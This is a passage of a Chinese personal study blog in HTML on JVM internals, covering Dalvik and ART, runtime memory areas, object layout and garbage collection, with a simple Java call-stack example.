id=\"Dalvik-VM\"><a href=\"#Dalvik-VM\" class=\"headerlink\" title=\"Dalvik VM\"></a>Dalvik VM</h3><blockquote>\n<p>为Android而生</p>\n</blockquote>\n<blockquote>\n<p>Dalvik是<a href=\"https://baike.baidu.com/item/Google/86964\">Google</a>公司自己设计用于Android平台的<a href=\"https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E6%9C%BA/104440\">虚拟机</a>。Dalvik虚拟机是Google等厂商合作开发的Android移动设备平台的核心组成部分之一。它可以支持已转换为 .dex（即Dalvik Executable）格式的Java应用程序的运行，.dex格式是专为Dalvik设计的一种<a href=\"https://baike.baidu.com/item/%E5%8E%8B%E7%BC%A9%E6%A0%BC%E5%BC%8F/2844535\">压缩格式</a>，适合内存和处理器速度有限的系统。Dalvik 经过优化，允许在有限的内存中同时运行多个虚拟机的实例，并且每一个Dalvik 应用作为一个独立的Linux 进程执行。独立的进程可以防止在虚拟机崩溃的时候所有程序都被关闭。</p>\n<p>很长时间以来，Dalvik虚拟机一直被用户指责为拖慢安卓系统运行速度不如IOS的根源。</p>\n<p>2014年6月25日，Android L 正式亮相于召开的谷歌I&#x2F;O大会，Android L 改动幅度较大，<a href=\"https://baike.baidu.com/item/%E8%B0%B7%E6%AD%8C/117920\">谷歌</a>将直接删除Dalvik，代替它的是传闻已久的ART。</p>\n</blockquote>\n<h3 id=\"ART\"><a href=\"#ART\" class=\"headerlink\" title=\"ART\"></a>ART</h3><blockquote>\n<p>ART(Android Runtime)是Android 4.4发布的，用来替换Dalvik虚拟，Android 4.4之前默认采用的还是DVM，系统会提供一个选项来开启ART模式。在Android 5.0时，默认采用ART，DVM从此退出历史舞台。</p>\n</blockquote>\n<p><strong>Dalvik虚拟机执行的是dex字节码，ART虚拟机执行的是本地机器码。</strong></p>\n<blockquote>\n<p>Dalvik执行的是dex字节码，依靠JIT编译器去解释执行，运行时动态地将执行频率很高的dex字节码翻译成本地机器码，然后在执行，但是将dex字节码翻译成本地机器码是发生在应用程序的运行过程中，并且应用程序每一次重新运行的时候，都要重新做这个翻译工作，因此，即使采用了JIT，Dalvik虚拟机的总体性能还是不能与直接执行本地机器码的ART虚拟机相比。 安卓运行时从Dalvik虚拟机替换成ART虚拟机，并不要求开发者重新将自己的应用直接编译成目标机器码，也就是说，应用程序仍然是一个包含dex字节码的apk文件。所以在安装应用的时候，dex中的字节码将被编译成本地机器码，之后每次打开应用，执行的都是本地机器码。移除了运行时的解释执行，效率更高，启动更快。（安卓在4.4中发布了ART运行时）</p>\n</blockquote>\n<p>ART优点:</p>\n<ul>\n<li>系统性能显著提升</li>\n<li>应用启动更快、运行更快、体验更流畅、触感反馈更及时</li>\n<li>续航能力提升</li>\n<li>支持更低的硬件</li>\n</ul>\n<p>ART缺点:</p>\n<ul>\n<li>更大的存储空间占用，可能增加10%-20%</li>\n<li>更长的应用安装时间</li>\n</ul>\n<blockquote>\n<p>应廖老师的要求，讲讲ART的GC</p>\n</blockquote>\n<p>&#x2F;&#x2F; TODO 内容好多，我太难了</p>\n<h2 id=\"自行编译JDK8\"><a href=\"#自行编译JDK8\" class=\"headerlink\" title=\"自行编译JDK8\"></a>自行编译JDK8</h2><p>非常麻烦，看看有没有时间去做。自行编译jvm可以对jvm打断点，还是很有帮助的。</p>\n<p>&#x2F;&#x2F; TODO</p>\n<h2 id=\"内存管理\"><a href=\"#内存管理\" class=\"headerlink\" title=\"内存管理\"></a>内存管理</h2><p>对于从事C，C++程序开发的开发人员，在内存管理领域，他们需要手动分配&#x2F;释放内存。虽然这是一件繁琐的工作，但这也使C++等一系列需要手动管理内存的语言能做到更多的事情。例如MMKV，它的底层原理使用C++实现——手动管理了一块堆外内存。(但其实Java也并非做不到这个，Unsafe类中提供了手动分配&#x2F;释放堆外内存的方法，并且提供了跟C++一样的面向指针的操作方法。)</p>\n<p>得益于JVM强大的内存管理机制，JVM语言程序员不需要手动为每个对象分配&#x2F;释放堆内存，一切看起来相当美好。但正是因为我们将内存管理的程序交给了JVM，一旦出现内存泄漏的问题，如果不清楚JVM内存管理机制的原理就很难解决问题。</p>\n<h3 id=\"运行时数据区\"><a href=\"#运行时数据区\" class=\"headerlink\" title=\"运行时数据区\"></a>运行时数据区</h3><p>Java虚拟机在执行Java程序的过程中会把它管理的内存划分为若干个不同的数据区域:</p>\n<p><img src=\"http://images2015.cnblogs.com/blog/1182497/201706/1182497-20170616192739978-1176032049.png\" alt=\"Java虚拟机运行时数据区\"></p>\n<h4 id=\"程序计数器\"><a href=\"#程序计数器\" class=\"headerlink\" title=\"程序计数器\"></a>程序计数器</h4><p>程序计数器占用了比较小的一块内存空间，可以看作是<strong>当前线程</strong>所执行字节码的行号(字节码的行号，不是代码的行号，字节码应该包含有对应代码行数的信息)指示器。字节码解释器在工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令, 它是<strong>程序控制流</strong>的指示器，流程控制，异常处理，线程恢复都需要依赖它来实现。</p>\n<p>Java虚拟机的多线程是通过<strong>线程轮流切换，分配处理器时间</strong>实现的，因此在任何一个确定的时刻，一个内核都只会执行一条线程中的指令（即并发执行)。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个程序计数器。因此程序计数器是<strong>线程私有</strong>的。</p>\n<p><strong>—这里稍微讲讲Java的线程调度 &amp; 协程—</strong></p>\n<p>这里引用一段别人的话，上面我可能表述得不是很准确</p>\n<blockquote>\n<p>因为Java的多线程也是依靠时间片轮转算法进行的，因此一个CPU同一时间也只会处理一个线程，当某个线程的时间片消耗完成后，会自动切换到下一个线程继续执行，而当前线程的执行位置会被保存到当前线程的程序计数器中，当下次轮转到此线程时，又继续根据之前的执行位置继续向下执行。</p>\n</blockquote>\n<blockquote>\n<p><strong>单核</strong>的CPU是一种假的多线程，因为在一个时间单元内，也只能执行一个线程的任务。同时间段内有多个线程需要CPU去运行时，CPU也只能交替去执行多个线程中的一个线程，但是由于其执行速度特别快，因此感觉不出来。</p>\n</blockquote>\n<p>按照上面的说法，我们发现，其实线程可以看作一个任务，<strong>内核一直在很多线程之间反复横跳</strong>: 这个做一会儿就停下来，去做下一个。</p>\n<p>但这里就会出现一个问题，使用<code>Thread.sleep(long)</code>停下的线程，内核会怎么办？答案是仍然会到他身上去，但什么也不做，就白白浪费了给cpu分配的时间分片。这就是这种设计的局限性，且不说创建一个新的线程相当占内存，即便是内存足够，并发效率也相当差（其实跟Java当时刚出的时候的其他语言比起来已经很不错了）。线程池当然也会有这个问题。</p>\n<p>那么理想的状态是什么呢？我让这个线程休眠了，你cpu就不要管他，把时间分给其他有任务的线程。</p>\n<p>两条路，要么你从内核层面去改良，去教cpu做事。对应了<code>Thread#yield()</code>,让当前线程把自己的时间让给其他线程，实现<strong>抢占式调度</strong>。</p>\n<p>另外一条道路就是协程，从用户层面改良，cpu教我做事。</p>\n<blockquote>\n<p>如果你觉得Thread#sleep会浪费并发效率，那你就不要用！你要提交能充分利用我效率的任务，而不是一味的谩骂和指责。</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t—— CPU</p>\n</blockquote>\n<p>既然<code>Thread.sleep()</code>会导致并发效率低下，那我就不用！在线程下面再区分出来一个协程的概念，在这里把无用的任务过滤一遍，再交给线程。这样每个内核对每个线程的利用率就提高了，也可以提高并发效率。</p>\n<p>是不是感觉java的线程也挺像协程的:)，之前蔷神讲协程也说过线程也可以看成协程的一种实现。我个人觉得他们唯一不同的地方就在于线程是由内核来调度，处于<strong>内核态</strong>，协程由用户编写的逻辑进行调度，处于<strong>用户态</strong>。协程其实是减少了内核的<strong>无用的</strong>工作量，所以并发吞吐量更大。</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-161709.jpg\"></p>\n<p><strong>—私货结束—</strong></p>\n<p>程序计数器是JVM唯一一个不会产生OOM的内存区域。</p>\n<blockquote>\n<p>在执行Java方法时，程序计数器的值为正在执行的虚拟机字节码指令的地址</p>\n<p>在执行本地方法时，程序计数器的值为空(undefined)</p>\n</blockquote>\n<h4 id=\"虚拟机栈\"><a href=\"#虚拟机栈\" class=\"headerlink\" title=\"虚拟机栈\"></a>虚拟机栈</h4><p>其实大家应该都知道所谓堆和栈的概念吧。即便Jvm的堆和栈你没有了解过，在C&#x2F;C++课上应该也了解过堆栈的概念吧？虽然C++这种直接编译到native的语言中的堆和栈与Jvm语言中的堆和栈并不是一个东西——JVM是virtual machine，是虚拟机，它的一切特性都是软件模拟的。C++中我们执行程序直接使用硬件的堆栈，而Java我们执行程序使用JVM为我们模拟出来的堆栈。</p>\n<p>与程序计数器一样，虚拟机栈也是线程私有的, 它的生命周期与线程相同，随线程的释放而释放。每当一个方法被调用，虚拟机都会同步创建一个栈帧用于存储<strong>局部变量表，操作数栈，动态连接，方法出口</strong>等信息。每一个方法从调用到返回的过程就对应着一个栈帧入栈到出栈的过程。</p>\n<p>这里从别人那里抄来了一个流程图解</p>\n<blockquote>\n<p>可能听起来有点懵逼，这里我们来模拟一下整个虚拟机栈的运作流程，先编写一个测试类：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">></span><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">return</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">return</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n<span class=\"token operator\">></span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当我们的主方法执行后，会依次执行三个方法<code>a() -&gt; b() -&gt; c() -&gt; 返回</code></p>\n<p>可以看到在编译之后，我们整个方法的最大操作数栈深度、局部变量表都是已经确定好的，当我们程序开始执行时，会根据这些信息封装为对应的栈帧，我们从<code>main</code>方法开始看起：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywucw6rcyj30ws0gyq4h.jpg\" alt=\"image-20220131142625842\"></p>\n<p>接着我们继续往下，调用方法<code>a()</code>，这时当前方法就不会继续向下运行了，而是去执行方法<code>a()</code>，那么同样的，将此方法也入栈，注意是放入到栈顶位置，<code>main</code>方法的栈帧会被压下去：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywuhfjok5j30v40g875z.jpg\" alt=\"image-20220131143641690\"></p>\n<p>这时，进入方法a之后，又继而进入到方法b，最后在进入c，因此，到达方法c的时候，我们的虚拟机栈变成了：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywun3qnp6j30zq0h6jtq.jpg\" alt=\"image-20220131144209743\"></p>\n<p>现在我们依次执行方法c中的指令，最后返回a+b的结果，在方法c返回之后，也就代表方法c已经执行结束了，栈帧4会自动出栈，这时栈帧3就得到了上一栈帧返回的结果，并继续执行，但是由于紧接着马上就返回，所以继续重复栈帧4的操作，此时栈帧3也出栈并继续将结果交给下一个栈帧2，最后栈帧2再将结果返回给栈帧1，然后栈帧1就可以继续向下运行了，最后输出结果。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNgy1gywxbv24qlj30tk0giwg2.jpg\" alt=\"image-20220131144955668\"></p>\n</blockquote>\n<p>虚拟机栈并不是无限大的，如果其中堆积的栈帧数量太多就会<strong>爆栈</strong>(StackOverFlowException)，我们可以通过<code>-Xss size</code>的vm options设置虚拟机的栈大小。</p>\n<p>常见关于虚拟机栈的问题:</p>\n<p>垃圾回收是否涉及栈内存？</p>\n<ul>\n<li><strong>不涉及</strong>，垃圾回收只涉及堆内存。在方法返回后其对应的栈帧就会出栈，所以不需要回收内存。</li>\n</ul>\n<p>栈内存分配得越大越好吗?</p>\n<ul>\n<li><strong>不</strong>，栈内存大了，其他的内存区域就小了。有时你对递归调用并没有这么大的需求，毕竟所有的递归调用都可以通过循环实现。</li>\n</ul>\n<h4 id=\"本地方法栈\"><a href=\"#本地方法栈\" class=\"headerlink\" title=\"本地方法栈\"></a>本地方法栈</h4><p>本地方法栈其实跟虚拟机栈的作用非常相似，只是他们一个为字节码层面的方法服务，一个为本地方法服务。</p>\n<h4 id=\"Java堆\"><a href=\"#Java堆\" class=\"headerlink\" title=\"Java堆\"></a>Java堆</h4><p>Java堆是虚拟机管理的内存中最大的一块, 用来存放对象实例。也是GC的主战场。不同于以上几个区域，Java堆是线程间共享的。所以在访问堆中存储的数据需要注意线程安全问题。</p>\n<h4 id=\"方法区\"><a href=\"#方法区\" class=\"headerlink\" title=\"方法区\"></a>方法区</h4><p>与Java堆一样是线程间共享的区域，它主要用于存储已经被虚拟机加载的<strong>类型信息，常量，静态变量，即时编译器编译后的代码缓存</strong>。虽然《Java虚拟机规范》中把方法区描述为堆的一个逻辑部分，但它却有一个别名叫做“非堆”(Non-Heap)，目的是与Java堆区分开来。</p>\n<p>你可能会听说方法区就是堆的永久代这个说法，实际不是这样的。仅仅只是因为HotSpot VM选择使用永久代来实现方法区，但实际上这是两个完全不同的概念。</p>\n<blockquote>\n<p>可能看起来有点突兀，只是写到这里的时候突然想说一下JIT（即时编译器）的工作流程</p>\n<p>这里可以发现其实jvm并非单纯解释执行字节码，而是在解释量达到一定阈值后触发即时编译，将编译后的字节码缓存到方法区，下次调用时便可以直接执行编译后的机器码。（也就是说常用的方法会被缓存为机器码）</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-b6f9389c136957504a5c1ae563aba5f3_1440w.jpg\" alt=\"img\"></p>\n</blockquote>\n<p><strong>运行时常量池</strong></p>\n<p>运行时常量池是方法区的一部分。在类加载时JVM读取class文件中常量池表的信息，并把它存入运行时常量池。至于常量池表，下面我们讲字节码的时候再详细介绍，现在我们只需要知道它是存放程序运行所需的常量即可。</p>\n<p>而运行时常量池的另外一个重要特征就是具备<strong>动态性</strong>，Java并不要求常量一定只有在编译期才能产生，这点与c++不同，运行期间也可以有新的常量进入常量池。这种特性被开发人员利用得比较多的就是<code>String#intern()</code>方法。</p>\n<blockquote>\n<p>关于String#intern方法，直接使用双引号声明的字符串都会直接存储在常量池中</p>\n<p>而非通过双引号声明出来的字符串可以使用String#intern方法查询常量池中是否存在该字符串，若不存在就会将其放入常量池</p>\n<p>是不是又可以理解java的字符串对象为什么不可变了，因为我们一般获取的字符串都会存储在常量池中，如果直接对字符串对象动刀岂不是没有意义了</p>\n<p>这也是为什么不推荐直接通过String的构造方法获得一个String对象的原因，因为这样会new出来一个新对象，而非存储在常量池中的字符串</p>\n</blockquote>\n<h3 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象</h3><h4 id=\"创建对象大致流程\"><a href=\"#创建对象大致流程\" class=\"headerlink\" title=\"创建对象大致流程\"></a>创建对象大致流程</h4><h5 id=\"类加载检查\"><a href=\"#类加载检查\" class=\"headerlink\" title=\"类加载检查\"></a>类加载检查</h5><p>当jvm遇到一条字节码new指令的时候，首先将会检查这个指令的参数是否能在常量池定位到一个类的符号引用，并且检查这个符号引用代表的类是否已经被加载，解析和初始化过。如果没有，先执行相应的类加载过程。</p>\n<h5 id=\"分配内存\"><a href=\"#分配内存\" class=\"headerlink\" title=\"分配内存\"></a>分配内存</h5><ul>\n<li>指针碰撞</li>\n</ul>\n<p>​\t在Java堆规整的情况下（所有对象的地址连续），为新对象分配内存只需要把指针向空闲区域移动</p>\n<ul>\n<li>空闲列表</li>\n</ul>\n<p>​\t在Java堆内存存放分散的情况下，我们必须维护一个列表，记录哪些内存块是可用的，分配内存时从列表中找到合适的内存块，并更新表上的记录。</p>\n<p><strong>分配内存这个过程需要保证线程安全</strong>，一般采取两种做法: </p>\n<ul>\n<li>对分配内存空间的动作进行同步处理——实际上虚拟机是采用CAS配上失败重试的方式保证更新操作的原子性</li>\n<li>为每条线程预先分配一块堆内存，即本地线程分配缓冲，哪个线程要分配内存，就在哪个线程的本地缓冲区分配。本地缓冲区消耗完了才会锁同步。</li>\n</ul>\n<h5 id=\"初始化内存空间\"><a href=\"#初始化内存空间\" class=\"headerlink\" title=\"初始化内存空间\"></a>初始化内存空间</h5><p>即为对象的成员变量赋初值，没有赋初值的初始化为类型对应零值（引用类型对应null）</p>\n<h5 id=\"初始化对象头-Object-Header\"><a href=\"#初始化对象头-Object-Header\" class=\"headerlink\" title=\"初始化对象头 (Object Header)\"></a>初始化对象头 (Object Header)</h5><p>Java虚拟机需要对对象进行必要的设置，例如这个对象是哪个类的实例，如何才能找到类的元数据信息，对象的hash code(实际上会延后到调用<code>Object#hashCode()</code>才会计算)，对象的GC分代年龄等信息，这些信息会存放在对象的<strong>对象头</strong>中。</p>\n<h5 id=\"调用构造器\"><a href=\"#调用构造器\" class=\"headerlink\" title=\"调用构造器\"></a>调用构造器</h5><p>使用正常途径新建对象必不可少的环节，当然使用<code>Unsafe#allocateInstance()</code>创建对象是可以跳过这一步的。(Gson的反序列化出来的对象就是使用它新建的，所以说它不适合Kt，因为Kt的空安全检查逻辑实际上是写在构造器里的，Gson这样做直接跳过了空安全检查)</p>\n<h4 id=\"对象的内存布局\"><a href=\"#对象的内存布局\" class=\"headerlink\" title=\"对象的内存布局\"></a>对象的内存布局</h4><p>在HotSpot虚拟机中，对象在堆内存中的储存布局可以划分为三个部分: 对象头(Header)，实例数据(Instance Data)和对齐填充(Padding)。</p>\n<p>对象头中包含两类信息: 第一类是用于存储对象自身的运行时数据，如HashCode，GC分代年龄，锁状态标志，线程持有的锁，偏向线程ID，偏向时间戳等，这部分数据的长度在32位和64位的虚拟机中分别为32和64个bit，官方称它为“Mark World”。</p>\n<p>实例数据部分是对象真正存储的有效信息，即我们在程序代码中所定义的字段等内容</p>\n<p>对齐填充部分只是起到一个占位符的作用，由于HotSpot虚拟机的自动内存管理系统要求对象起始地址必须是8字节的整数倍，也就是说任何对象的大小都必须是8字节的倍数。对象头部分已经被精心设计为8字节的倍数（1倍或2倍）。因此，如果对象实例数据部分没有对齐的话，就需要通过对齐填充来补全。</p>\n<h4 id=\"对象的访问定位\"><a href=\"#对象的访问定位\" class=\"headerlink\" title=\"对象的访问定位\"></a>对象的访问定位</h4><p>创建对象自然是为了使用对象，我们的java程序一般通过栈上保存的<strong>reference</strong>(即引用)来操作堆上的具体对象。但Java虚拟机规范中只规定了这个reference类型是一个指向对象的引用，并没有强制要求这个引用应该如何定位，访问对象。所以对象访问方式也是由虚拟机实现而定的，主流的访问方式主要有使用<strong>句柄</strong>和<strong>指针</strong>。</p>\n<h5 id=\"句柄\"><a href=\"#句柄\" class=\"headerlink\" title=\"句柄\"></a>句柄</h5><blockquote>\n<p> 如果使用句柄访问的话，Java堆中将可能划分出一块内存来作为句柄池，reference中存储的就是对象的句柄地址，而句柄中包含了对象的实例数据与类型数据各自具体的地址信息</p>\n</blockquote>\n<p>使用句柄来访问的最大好处是reference中存储的是稳定的句柄地址，在对象被移动（GC时移动是很普遍的行为）时只会改变句柄中的实例数据指针，而reference本身不需要被修改。</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221205.png\" alt=\"飞书20220708-221205\"></p>\n<h5 id=\"指针\"><a href=\"#指针\" class=\"headerlink\" title=\"指针\"></a>指针</h5><blockquote>\n<p>如果直接使用指针访问的话，Java堆中对象的内存布局就必须考虑如何放置访问类型的相关信息，reference中存储的直接就是对象地址，如果只是访问对象本身的话，就不需要多一次访问的开销。</p>\n</blockquote>\n<p>直接使用指针访问的好处在与速度快，它节省了一次指针定位的开销，由于对象访问在java中非常频繁，这笔开销相当不容小觑。<strong>HotSpot</strong>虚拟机采用指针访问</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221128.png\" alt=\"飞书20220708-221128\"></p>\n<h3 id=\"垃圾回收-GC\"><a href=\"#垃圾回收-GC\" class=\"headerlink\" title=\"垃圾回收 (GC)\"></a>垃圾回收 (GC)</h3><p>大家应该都知道这个东西，我就不介绍了，直接切入正题</p>\n<h4 id=\"引用计数算法-amp-可达性分析算法\"><a href=\"#引用计数算法-amp-可达性分析算法\" class=\"headerlink\" title=\"引用计数算法 &amp; 可达性分析算法\"></a>引用计数算法 &amp; 可达性分析算法</h4><p>在堆中存放着Java世界中几乎所有的对象实例，垃圾收集器在堆中进行回收前，第一件事就是要确定这些对象之中还有哪些”存活“着，哪些已经“死去”。下面就讲一讲比较常见的两种判断的方法。</p>\n<h5 id=\"引用计数算法\"><a href=\"#引用计数算法\" class=\"headerlink\" title=\"引用计数算法\"></a>引用计数算法</h5><p>在对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就+1，引用失效时，计数器值就-1。任何时候计数器为0的对象是不可能再使用的，可以直接回收。</p>\n<p>虽然引用计数法简单高效，在大多数情况下是一个不错的算法。但主流的Java虚拟机并没有采用引用计数法进行内存管理，因为这个算法需要处理大量的意外情况——比如循环引用。</p>\n<h5 id=\"可达性分析算法\"><a href=\"#可达性分析算法\" class=\"headerlink\" title=\"可达性分析算法\"></a>可达性分析算法</h5><p>当前主流的商用应用语言（Java，C#等）的内存管理子系统都是通过<strong>可达性分析</strong>算法来判定对象是否存活。这个算法的基本思路就是通过一系列称为<strong>GC Roots</strong>的根对象作为起始节点集，从这些节点开始，根据引用关系向下搜索，搜索过程中走过路径称为<strong>引用链</strong>，如果某个对象到GC Roots间没有任何引用链相连，则该对象<strong>不可达</strong>，就会被判定为可回收的对象。</p>\n<p>可作为GC Roots的对象:</p>\n<ul>\n<li>在虚拟机栈中引用的对象</li>\n<li>方法区中类静态属性引用的对象 （例如Java的引用类型静态变量）</li>\n<li>方法区中常量引用的对象 （例如字符串常量池中的引用）</li>\n<li>在本地方法栈中JNI引用的对象</li>\n<li>Java虚拟机内部的引用，如<strong>基本数据类型对应的Class对象</strong>，一些常驻的异常对象（如NullPointerException）等，还有系统类加载器。</li>\n</ul>\n<p><img src=\"https://img-blog.csdn.net/20180626084654607?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YnVqaWFuX2w=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<h4 id=\"引用的类型\"><a href=\"#引用的类型\" class=\"headerlink\" title=\"引用的类型\"></a>引用的类型</h4><p>实际上GC的回收策略并不死板，在剩余内存较少的时候，GC会尽可能回收多的对象来腾出更多的内存空间。那么我们要如何规定在剩余内存较少的时候才需要回收的那部分对象呢？于是在JDK1.2之后，Java对引用的概念进行了扩充，将引用分为<strong>强引用，软引用，弱引用，虚引用</strong>四种类型。</p>\n<h5 id=\"强引用\"><a href=\"#强引用\" class=\"headerlink\" title=\"强引用\"></a>强引用</h5><p>最传统的引用定义，指程序代码中普遍存在的引用赋值。只要强引用关系存在，GC就不会回收被引用的对象。</p>\n<h5 id=\"软引用\"><a href=\"#软引用\" class=\"headerlink\" title=\"软引用\"></a>软引用</h5><p>软引用用来描述一些还需要用到，但非必须的对象，在内存不足时，GC会回收掉只被软引用关联的对象。可以使用<code>SoftReference</code>类来实现软引用。</p>\n<h5 id=\"弱引用\"><a href=\"#弱引用\" class=\"headerlink\" title=\"弱引用\"></a>弱引用</h5><p>只被弱引用关联的对象只能存活到下一次GC到来前。可以使用<code>WeakReference</code>类来实现弱引用。</p>\n<h5 id=\"虚引用\"><a href=\"#虚引用\" class=\"headerlink\" title=\"虚引用\"></a>虚引用</h5><p>相当于没有引用，也没有办法通过这种引用得到关联的对象，为一个对象设置虚引用的唯一目的就是为了能在对象被回收时收到通知。可以使用<code>PhantomReference</code>类来实现虚引用。</p>\n<h4 id=\"垃圾收集算法\"><a href=\"#垃圾收集算法\" class=\"headerlink\" title=\"垃圾收集算法\"></a>垃圾收集算法</h4><h5 id=\"分代收集理论\"><a href=\"#分代收集理论\" class=\"headerlink\" title=\"分代收集理论\"></a>分代收集理论</h5><p>实际上，如果我们对堆中的每一个对象都依次判断是否需要回收，这样的效率其实是很低的，那么有没有更好地回收机制呢？第一步，我们可以对堆中的对象进行分代管理。</p>\n<p>比如某些对象，在多次垃圾回收时，都未被判定为可回收对象，我们完全可以将这一部分对象放在一起，并让垃圾收集器减少回收此区域对象的频率，这样就能很好地提高垃圾回收的效率了。</p>\n<p>因此，Java虚拟机将堆内存划分为<strong>新生代</strong>、<strong>老年代</strong>和<strong>永久代</strong>（其中永久代是HotSpot虚拟机特有的概念，在JDK8之前方法区实际上就是采用的永久代作为实现，而在JDK8之后，方法区由元空间实现，并且使用的是本地内存，容量大小取决于物理机实际大小，之后会详细介绍）这里我们主要讨论的是<strong>新生代</strong>和<strong>老年代</strong>。</p>\n<p>不同的分代内存回收机制也存在一些不同之处，在HotSpot虚拟机中，新生代被划分为三块，一块较大的Eden空间和两块较小的Survivor空间，默认比例为8：1：1，老年代的GC评率相对较低，永久代一般存放类信息等（其实就是方法区的实现）如图所示：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbaa6eg9j217a0ggta0.jpg\" alt=\"image-20220222151708141\"></p>\n<p>那么它是如何运作的呢？</p>\n<p>首先，所有新创建的对象，在一开始都会进入到新生代的Eden区（如果是大对象会被直接丢进老年代），在进行新生代区域的垃圾回收时，首先会对所有新生代区域的对象进行扫描，并回收那些不再使用对象：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyo48r0j21i20cqq4l.jpg\" alt=\"image-20220222153104582\"></p>\n<p>接着，在一次垃圾回收之后，Eden区域没有被回收的对象，会进入到Survivor区。在一开始From和To都是空的，而GC之后，所有Eden区域存活的对象都会直接被放入到From区，最后From和To会发生一次交换，也就是说目前存放我们对象的From区，变为To区，而To区变为From区：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyn34yfj21gk0d4gn5.jpg\" alt=\"image-20220222154032674\"></p>\n<p>接着就是下一次垃圾回收了，操作与上面是一样的，不过这时由于我们From区域中已经存在对象了，所以，在Eden区的存活对象复制到From区之后，所有To区域中的对象会进行年龄判定（每经历一轮GC年龄<code>+1</code>，如果对象的年龄大于<code>默认值为15</code>，那么会直接进入到老年代，否则移动到From区）</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc6v1nzcj21h60d2q4l.jpg\" alt=\"image-20220222154828416\"></p>\n<p>最后像上面一样交换To区和From区，之后不断重复以上步骤。</p>\n<p>而垃圾收集也分为：</p>\n<ul>\n<li><p>Minor GC   -   次要垃圾回收，主要进行新生代区域的垃圾收集。</p>\n<ul>\n<li>触发条件：新生代的Eden区容量已满时。</li>\n</ul>\n</li>\n<li><p>Major GC   -   主要垃圾回收，主要进行老年代的垃圾收集。</p>\n</li>\n<li><p>Full GC      -    完全垃圾回收，对整个Java堆内存和方法区进行垃圾回收。</p>\n<ul>\n<li>触发条件1：每次晋升到老年代的对象平均大小大于老年代剩余空间</li>\n<li>触发条件2：Minor GC后存活的对象超过了老年代剩余空间</li>\n<li>触发条件3：永久代内存不足（JDK8之前）</li>\n<li>触发条件4：手动调用<code>System.gc()</code>方法</li>\n</ul>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzml30209wj21u80ren3q.jpg\" 